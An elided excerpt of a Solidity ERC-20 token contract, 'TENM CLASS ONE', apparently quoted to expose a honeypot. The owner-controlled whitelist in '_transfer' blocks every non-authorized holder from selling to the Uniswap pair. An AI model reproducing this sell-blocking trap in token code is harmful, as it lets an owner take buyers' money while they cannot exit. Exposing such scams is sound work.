...
contract TENMONE is Context, IERC20, Ownable {
    ...
    string private _name = "TENM CLASS ONE";
    string private _symbol = "TENMONE";
    ...
    function authorizedAddress(address account, bool value) external onlyOwner{
        _isAuthorized[account] = value;
    }
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair){
            require(_isAuthorized[from], "you are not authorized to sell");
        }
